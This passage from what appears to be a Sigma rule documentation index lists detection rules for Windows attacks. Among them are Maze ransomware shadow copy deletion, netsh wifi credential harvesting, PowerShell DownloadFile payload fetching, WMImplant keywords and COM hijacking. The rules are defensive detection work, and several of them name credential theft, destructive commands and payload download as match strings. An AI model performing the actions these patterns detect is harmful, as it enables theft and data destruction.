7b687634-ab20-11ea-bb37-0242ac130002 status: test description: Detects Windows Pcap driver installation based on a list of associated .sys files. author: Cian Heasley references: - https://ragged-lab.blogspot.com/2020/06/capturing-pcap-driver-installations.html#more date: 2020/06/10 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: - \u0026#39;pcap\u0026#39; - \u0026#39;npcap\u0026#39; - \u0026#39;npf\u0026#39; - \u0026#39;nm3\u0026#39; - \u0026#39;ndiscap\u0026#39; - \u0026#39;nmnt\u0026#39; - \u0026#39;windivert\u0026#39; - \u0026#39;USBPcap\u0026#39; - \u0026#39;pktmon\u0026#39; condition: selection fields: - EventID - ServiceFileName - Account_Name - Computer_Name - Originating_Computer - ServiceName falsepositives: - unknown level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_pcap_drivers.yml/","tags":["attack.discovery","attack.credential_access","attack.t1040"],"title":"Windows Pcap Drivers"},{"categories":null,"contents":"Detects logons using NTLM to hosts that are potentially not part of the domain.\nKnown false-positives Host connections to valid domains, exclude these. Host connections not using host FQDN. Host connections to external legitimate domains. References n/a Raw rule (edit) title: Potential Remote Desktop Connection to Non-Domain Host id: ce5678bb-b9aa-4fb5-be4b-e57f686256ad status: test description: Detects logons using NTLM to hosts that are potentially not part of the domain. author: James Pemberton references: - n/a date: 2020/05/22 modified: 2021/11/27 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8001 TargetName|startswith: TERMSRV condition: selection fields: - Computer - UserName - DomainName - TargetName falsepositives: - Host connections to valid domains, exclude these. - Host connections not using host FQDN. - Host connections to external legitimate domains. level: medium tags: - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/ntlm/win_susp_ntlm_rdp.yml/","tags":["attack.command_and_control","attack.t1219"],"title":"Potential Remote Desktop Connection to Non-Domain Host"},{"categories":null,"contents":"Detects a new and suspicious printer port creation in Registry that could be an attempt to exploit CVE-2020-1048\nKnown false-positives New printer port install on host References https://windows-internals.com/printdemon-cve-2020-1048/ Raw rule (edit) title: Suspicious New Printer Ports in Registry (CVE-2020-1048) id: 7ec912f2-5175-4868-b811-ec13ad0f8567 status: test description: Detects a new and suspicious printer port creation in Registry that could be an attempt to exploit CVE-2020-1048 author: EagleEye Team, Florian Roth, NVISO references: - https://windows-internals.com/printdemon-cve-2020-1048/ date: 2020/05/13 modified: 2022/01/13 logsource: product: windows category: registry_event detection: selection: EventType: SetValue TargetObject|startswith: \u0026#39;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports\u0026#39; Details|contains: - \u0026#39;.dll\u0026#39; - \u0026#39;.exe\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.com\u0026#39; - \u0026#39;C:\u0026#39; condition: selection falsepositives: - New printer port install on host level: high tags: - attack.persistence - attack.execution - attack.defense_evasion - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_cve_2020_1048.yml/","tags":["attack.persistence","attack.execution","attack.defense_evasion","attack.t1112"],"title":"Suspicious New Printer Ports in Registry (CVE-2020-1048)"},{"categories":null,"contents":"Detects suspicious network connection by Notepad\nKnown false-positives None observed so far References https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf https://blog.cobaltstrike.com/2013/08/08/why-is-notepad-exe-connecting-to-the-internet/ Raw rule (edit) title: Notepad Making Network Connection id: e81528db-fc02-45e8-8e98-4e84aba1f10b status: test description: Detects suspicious network connection by Notepad author: EagleEye Team references: - https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf - https://blog.cobaltstrike.com/2013/08/08/why-is-notepad-exe-connecting-to-the-internet/ date: 2020/05/14 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\notepad.exe\u0026#39; filter: DestinationPort: \u0026#39;9100\u0026#39; condition: selection and not filter falsepositives: - None observed so far level: high tags: - attack.command_and_control - attack.execution - attack.defense_evasion - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_notepad_network_connection.yml/","tags":["attack.command_and_control","attack.execution","attack.defense_evasion","attack.t1055"],"title":"Notepad Making Network Connection"},{"categories":null,"contents":"Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups.\nKnown false-positives Legitimate administrative use References https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/ https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html https://labs.f-secure.com/blog/prelude-to-ransomware-systembc https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner Raw rule (edit) title: Advanced IP Scanner id: bef37fa2-f205-4a7b-b484-0759bfd5f86f status: experimental description: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups. references: - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/ - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html - https://labs.f-secure.com/blog/prelude-to-ransomware-systembc - https://assets.documentcloud.org/documents/20444693/fbi-pin-egregor-ransomware-bc-01062021.pdf - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20IP%20Scanner author: \u0026#39;@ROxPinTeddy, Nasreddine Bencherchali @nas_bench\u0026#39; date: 2020/05/12 modified: 2021/12/18 tags: - attack.discovery - attack.t1046 - attack.t1135 logsource: category: process_creation product: windows detection: selection1: Image|contains: \u0026#39;\\advanced_ip_scanner\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;/portable\u0026#39; - \u0026#39;/lng\u0026#39; condition: 1 of selection* falsepositives: - Legitimate administrative use level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_advanced_ip_scanner.yml/","tags":["attack.discovery","attack.t1046","attack.t1135"],"title":"Advanced IP Scanner"},{"categories":null,"contents":"Detects enumeration of the global catalog (that can be performed using BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain width.\nKnown false-positives Exclude known DCs. References https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156 Raw rule (edit) title: Enumeration via the Global Catalog description: Detects enumeration of the global catalog (that can be performed using BloodHound or others AD reconnaissance tools). Adjust Threshold according to domain width. status: experimental author: Chakib Gzenayi (@Chak092), Hosni Mribah id: 619b020f-0fd7-4f23-87db-3f51ef837a34 date: 2020/05/11 modified: 2021/06/01 references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156 tags: - attack.discovery - attack.t1087.002 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Windows Filtering Platform \u0026gt; Filtering Platform Connection\u0026#34; must be configured for Success\u0026#39; detection: selection: EventID: 5156 DestinationPort: - 3268 - 3269 timeframe: 1h condition: selection | count() by SourceAddress \u0026gt; 2000 falsepositives: - Exclude known DCs. level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_global_catalog_enumeration.yml/","tags":["attack.discovery","attack.t1087.002"],"title":"Enumeration via the Global Catalog"},{"categories":null,"contents":"Detects specific process characteristics of Maze ransomware word document droppers\nKnown false-positives Unlikely References https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html https://app.any.run/tasks/51e7185c-52d7-4efb-ac0d-e86340053473/ https://app.any.run/tasks/65a79440-373a-4725-8d74-77db9f2abda4/ Raw rule (edit) title: Maze Ransomware id: 29fd07fc-9cfd-4331-b7fd-cc18dfa21052 status: experimental description: Detects specific process characteristics of Maze ransomware word document droppers references: - https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html - https://app.any.run/tasks/51e7185c-52d7-4efb-ac0d-e86340053473/ - https://app.any.run/tasks/65a79440-373a-4725-8d74-77db9f2abda4/ author: Florian Roth date: 2020/05/08 modified: 2021/06/27 tags: - attack.execution - attack.t1204.002 - attack.t1047 - attack.impact - attack.t1490 logsource: category: process_creation product: windows detection: # Dropper selection1: ParentImage|endswith: - \u0026#39;\\WINWORD.exe\u0026#39; Image|endswith: - \u0026#39;.tmp\u0026#39; # Binary Execution selection2: Image|endswith: \u0026#39;\\wmic.exe\u0026#39; ParentImage|contains: \u0026#39;\\Temp\\\u0026#39; CommandLine|endswith: \u0026#39;shadowcopy delete\u0026#39; # Specific Pattern selection3: CommandLine|endswith: \u0026#39;shadowcopy delete\u0026#39; CommandLine|contains: \u0026#39;\\..\\..\\system32\u0026#39; condition: 1 of selection* fields: - ComputerName - User - Image falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_crime_maze_ransomware.yml/","tags":["attack.execution","attack.t1204.002","attack.t1047","attack.impact","attack.t1490"],"title":"Maze Ransomware"},{"categories":null,"contents":"Detect the harvesting of wifi credentials using netsh.exe\nKnown false-positives Legitimate administrator or user uses netsh.exe wlan functionality for legitimate reason References https://blog.malwarebytes.com/threat-analysis/2020/04/new-agenttesla-variant-steals-wifi-credentials/ Raw rule (edit) title: Harvesting of Wifi Credentials Using netsh.exe id: 42b1a5b8-353f-4f10-b256-39de4467faff status: test description: Detect the harvesting of wifi credentials using netsh.exe author: Andreas Hunkeler (@Karneades), oscd.community references: - https://blog.malwarebytes.com/threat-analysis/2020/04/new-agenttesla-variant-steals-wifi-credentials/ date: 2020/04/20 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - \u0026#39;wlan\u0026#39; - \u0026#39; s\u0026#39; - \u0026#39; p\u0026#39; - \u0026#39; k\u0026#39; - \u0026#39;=clear\u0026#39; condition: selection falsepositives: - Legitimate administrator or user uses netsh.exe wlan functionality for legitimate reason level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_wifi_credential_harvesting.yml/","tags":["attack.discovery","attack.credential_access","attack.t1040"],"title":"Harvesting of Wifi Credentials Using netsh.exe"},{"categories":null,"contents":"Detects downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity\nKnown false-positives Unknown References https://breakdev.org/pwndrop/ Raw rule (edit) title: PwnDrp Access id: 2b1ee7e4-89b6-4739-b7bb-b811b6607e5e status: test description: Detects downloads from PwnDrp web servers developed for red team testing and most likely also used for criminal activity author: Florian Roth references: - https://breakdev.org/pwndrop/ date: 2020/04/15 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;/pwndrop/\u0026#39; condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.001 - attack.t1102.001 - attack.t1102.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_pwndrop.yml/","tags":["attack.command_and_control","attack.t1071.001","attack.t1102.001","attack.t1102.003"],"title":"PwnDrp Access"},{"categories":null,"contents":"Detects potential COM object hijacking leveraging the COM Search Order\nKnown false-positives Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level References https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/ https://attack.mitre.org/techniques/T1546/015/ Raw rule (edit) title: Windows Registry Persistence COM Search Order Hijacking id: a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12 status: experimental description: Detects potential COM object hijacking leveraging the COM Search Order references: - https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/ - https://attack.mitre.org/techniques/T1546/015/ author: Maxime Thiebaut (@0xThiebaut), oscd.community, Cédric Hien date: 2020/04/14 modified: 2022/03/05 tags: - attack.persistence - attack.t1546.015 logsource: category: registry_event product: windows detection: selection: # Detect new COM servers in the user hive EventType: SetValue TargetObject|startswith: - \u0026#39;HKCR\\CLSID\\\u0026#39; - \u0026#39;HKCU\\Software\\Classes\\CLSID\\\u0026#39; TargetObject|endswith: \u0026#39;\\InprocServer32\\(Default)\u0026#39; filter1: Details|contains: # Exclude privileged directories and observed FPs - \u0026#39;%%systemroot%%\\system32\\\u0026#39; - \u0026#39;%%systemroot%%\\SysWow64\\\u0026#39; filterOneDrive: Details|contains: - \u0026#39;\\AppData\\Local\\Microsoft\\OneDrive\\\u0026#39; - \u0026#39;\\FileCoAuthLib64.dll\u0026#39; - \u0026#39;\\FileSyncShell64.dll\u0026#39; - \u0026#39;\\FileSyncApi64.dll\u0026#39; filter2: Details|contains|all: - \u0026#39;\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\\u0026#39; - \u0026#39;\\Microsoft.Teams.AddinLoader.dll\u0026#39; filter3: Details|contains|all: - \u0026#39;\\AppData\\Roaming\\Dropbox\\\u0026#39; - \u0026#39;\\DropboxExt64.*.dll\u0026#39; filter4: Details|endswith: TmopIEPlg.dll #TrendMicro osce filter5: Image: - C:\\WINDOWS\\system32\\wuauclt.exe - C:\\WINDOWS\\system32\\svchost.exe filter_defender: Image|startswith: - \u0026#39;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\u0026#39; - \u0026#39;C:\\Program Files\\Windows Defender\\\u0026#39; Image|endswith: \u0026#39;\\MsMpEng.exe\u0026#39; filter_nvidia: Details|contains: - \u0026#39;\\FileRepository\\nvmdi.inf\u0026#39; filter_edge: Image|endswith: \u0026#39;\\MicrosoftEdgeUpdateComRegisterShell64.exe\u0026#39; filter_dx: Image: \u0026#39;C:\\WINDOWS\\SYSTEM32\\dxdiag.exe\u0026#39; filter_python: Details: - \u0026#39;C:\\Windows\\pyshellext.amd64.dll\u0026#39; - \u0026#39;C:\\Windows\\pyshellext.dll\u0026#39; filter_bonjourlib: Details: - \u0026#39;C:\\Windows\\system32\\dnssdX.dll\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\dnssdX.dll\u0026#39; filter_programfiles: Details|startswith: - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; filter_gameservice: Details|contains: \u0026#39;C:\\WINDOWS\\system32\\GamingServicesProxy.dll\u0026#39; condition: selection and not 1 of filter* falsepositives: - Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_persistence_search_order.yml/","tags":["attack.persistence","attack.t1546.015"],"title":"Windows Registry Persistence COM Search Order Hijacking"},{"categories":null,"contents":"Detects creation of a local user via PowerShell\nKnown false-positives Legitimate user creation References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.md Raw rule (edit) title: PowerShell Create Local User id: 243de76f-4725-4f2e-8225-a8a69b15ad61 status: experimental description: Detects creation of a local user via PowerShell references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.md tags: - attack.execution - attack.t1059.001 - attack.persistence - attack.t1136.001 author: \u0026#39;@ROxPinTeddy\u0026#39; date: 2020/04/11 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;New-LocalUser\u0026#39; condition: selection falsepositives: - Legitimate user creation level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_create_local_user.yml/","tags":["attack.execution","attack.t1059.001","attack.persistence","attack.t1136.001"],"title":"PowerShell Create Local User"},{"categories":null,"contents":"Detects parameters used by WMImplant\nKnown false-positives Administrative scripts that use the same keywords. References https://github.com/FortyNorthSecurity/WMImplant Raw rule (edit) title: WMImplant Hack Tool id: 8028c2c3-e25a-46e3-827f-bbb5abf181d7 status: experimental description: Detects parameters used by WMImplant references: - https://github.com/FortyNorthSecurity/WMImplant tags: - attack.execution - attack.t1047 - attack.t1059.001 author: NVISO date: 2020/03/26 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;WMImplant\u0026#39; - \u0026#39; change_user \u0026#39; - \u0026#39; gen_cli \u0026#39; - \u0026#39; command_exec \u0026#39; - \u0026#39; disable_wdigest \u0026#39; - \u0026#39; disable_winrm \u0026#39; - \u0026#39; enable_wdigest \u0026#39; - \u0026#39; enable_winrm \u0026#39; - \u0026#39; registry_mod \u0026#39; - \u0026#39; remote_posh \u0026#39; - \u0026#39; sched_job \u0026#39; - \u0026#39; service_mod \u0026#39; - \u0026#39; process_kill \u0026#39; # - \u0026#39; process_start \u0026#39; - \u0026#39; active_users \u0026#39; - \u0026#39; basic_info \u0026#39; # - \u0026#39; drive_list \u0026#39; # - \u0026#39; installed_programs \u0026#39; - \u0026#39; power_off \u0026#39; - \u0026#39; vacant_system \u0026#39; - \u0026#39; logon_events \u0026#39; condition: selection falsepositives: - Administrative scripts that use the same keywords. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_wmimplant.yml/","tags":["attack.execution","attack.t1047","attack.t1059.001"],"title":"WMImplant Hack Tool"},{"categories":null,"contents":"Detects the usage of ADSI (LDAP) operations by tools. This may also detect tools like LDAPFragger.\nKnown false-positives Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc. References https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961 https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/ https://github.com/fox-it/LDAPFragger Raw rule (edit) title: Suspicious ADSI-Cache Usage By Unknown Tool id: 75bf09fa-1dd7-4d18-9af9-dd9e492562eb status: test description: Detects the usage of ADSI (LDAP) operations by tools. This may also detect tools like LDAPFragger. author: xknow @xknow_infosec references: - https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961 - https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/ - https://github.com/fox-it/LDAPFragger date: 2019/03/24 modified: 2022/02/21 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: \u0026#39;\\Local\\Microsoft\\Windows\\SchCache\\\u0026#39; TargetFilename|endswith: \u0026#39;.sch\u0026#39; filter: Image: - \u0026#39;C:\\windows\\system32\\svchost.exe\u0026#39; - \u0026#39;C:\\windows\\system32\\dllhost.exe\u0026#39; - \u0026#39;C:\\windows\\system32\\mmc.exe\u0026#39; - \u0026#39;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; - \u0026#39;C:\\Windows\\CCM\\CcmExec.exe\u0026#39; - \u0026#39;C:\\Program Files\\Cylance\\Desktop\\CylanceSvc.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\u0026#39; condition: selection and not filter falsepositives: - Other legimate tools, which do ADSI (LDAP) operations, e.g. any remoting activity by MMC, Powershell, Windows etc. level: high tags: - attack.t1001.003 - attack.command_and_control ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_adsi_cache_usage.yml/","tags":["attack.t1001.003","attack.command_and_control"],"title":"Suspicious ADSI-Cache Usage By Unknown Tool"},{"categories":null,"contents":"Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies.\nKnown false-positives Companies, who may use these default LDAP-Attributes for personal information References https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961 https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/ https://github.com/fox-it/LDAPFragger Raw rule (edit) title: Suspicious LDAP-Attributes Used id: d00a9a72-2c09-4459-ad03-5e0a23351e36 status: test description: Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies. author: xknow @xknow_infosec references: - https://medium.com/@ivecodoe/detecting-ldapfragger-a-newly-released-cobalt-strike-beacon-using-ldap-for-c2-communication-c274a7f00961 - https://blog.fox-it.com/2020/03/19/ldapfragger-command-and-control-over-ldap-attributes/ - https://github.com/fox-it/LDAPFragger date: 2019/03/24 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5136 AttributeValue: \u0026#39;*\u0026#39; AttributeLDAPDisplayName: - \u0026#39;primaryInternationalISDNNumber\u0026#39; - \u0026#39;otherFacsimileTelephoneNumber\u0026#39; - \u0026#39;primaryTelexNumber\u0026#39; condition: selection falsepositives: - Companies, who may use these default LDAP-Attributes for personal information level: high tags: - attack.t1001.003 - attack.command_and_control ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_ldap_dataexchange.yml/","tags":["attack.t1001.003","attack.command_and_control"],"title":"Suspicious LDAP-Attributes Used"},{"categories":null,"contents":"Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html Raw rule (edit) title: PowerShell DownloadFile id: 8f70ac5f-1f6f-4f8e-b454-db19561216c5 status: test description: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line author: Florian Roth references: - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html date: 2020/08/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;powershell\u0026#39; - \u0026#39;.DownloadFile\u0026#39; - \u0026#39;System.Net.WebClient\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1104 - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ps_downloadfile.yml/","tags":["attack.execution","attack.t1059.001","attack.command_and_control","attack.t1104","attack.t1105"],"title":"PowerShell DownloadFile"},{"categories":null,"contents":"Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html https://vulmon.com/exploitdetails?qidtp=exploitdb\u0026amp;qid=48224 Raw rule (edit) title: Exploited CVE-2020-10189 Zoho ManageEngine id: 846b866e-2a57-46ee-8e16-85fa92759be7 status: test description: Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189 author: Florian Roth references: - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html - https://vulmon.com/exploitdetails?qidtp=exploitdb\u0026amp;qid=48224 date: 2020/03/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;DesktopCentral_Server\\jre\\bin\\java.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.s0190 - cve.2020.10189 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_10189.yml/","tags":["attack.initial_access","attack.t1190","attack.execution","attack.t1059.001","attack.t1059.003","attack.s0190","cve.2020.10189"],"title":"Exploited CVE-2020-10189 Zoho ManageEngine"},{"categories":null,"contents":"Detects unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder\u0026rsquo;s content (i.e. renaming files) without changing them on disk.\nKnown false-positives Operations performed through Windows SCCM or equivalent read only access list authority References https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/ Raw rule (edit) title: Suspicious desktop.ini Action id: 81315b50-6b60-4d8f-9928-3466e1022515 status: test description: Detects unusual processes accessing desktop.ini, which can be leveraged to alter how Explorer displays a folder\u0026#39;s content (i.e. renaming files) without changing them on disk. author: Maxime Thiebaut (@0xThiebaut), Tim Shelton (HAWK.IO) references: - https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/ date: 2020/03/19 modified: 2021/12/03 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \u0026#39;\\desktop.ini\u0026#39; filter: Image|startswith: - \u0026#39;C:\\Windows\\\u0026#39; - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; condition: selection and not filter falsepositives: - Operations performed through Windows SCCM or equivalent - read only access list authority level: medium tags: - attack.persistence - attack.t1547.009 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_desktop_ini.yml/","tags":["attack.persistence","attack.t1547.009"],"title":"Suspicious desktop.ini Action"},{"categories":null,"contents":"Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access.\nKnown false-positives unknown References https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf Raw rule (edit) title: Cleartext Protocol Usage id: d7fb8f0e-bd5f-45c2-b467-19571c490d7e status: stable description: Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 modified: 2021/11/23 references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf logsource: category: firewall detection: selection1: dst_port: - 8080 - 21 - 80 - 23 - 50000 - 1521 - 27017 - 3306 - 1433 - 11211 - 15672 - 5900 - 5901 - 5902 - 5903 - 5904 selection2: action: - forward - accept - 2 condition: selection1 and selection2 falsepositives: - unknown level: low # tags: # - CSC4 # - CSC4.5 # - CSC14 # - CSC14.4 # - CSC16 # - CSC16.5 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 PR.DS-1 # - NIST CSF 1.1 PR.DS-2 # - ISO 27002-2013 A.9.2.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - ISO 27002-2013 A.8.3.1 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.10.1.1 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 # - PCI DSS 3.2 8.8 # - PCI DSS 3.2 1.3 # - PCI DSS 3.2 1.4 # - PCI DSS 3.2 4.3 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/compliance/firewall_cleartext_protocols.yml/","tags":null,"title":"Cleartext Protocol Usage"},{"categories":null,"contents":"Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access.\nKnown false-positives unknown References https://www.cisecurity.org/controls/cis-controls-list/ https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf Raw rule (edit) title: Cleartext Protocol Usage id: 7e4bfe58-4a47-4709-828d-d86c78b7cc1f status: stable description: Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - https://www.cisecurity.org/controls/cis-controls-list/ - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf # tags: # - CSC4 # - CSC4.5 # - CSC14 # - CSC14.4 # - CSC16 # - CSC16.5 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - 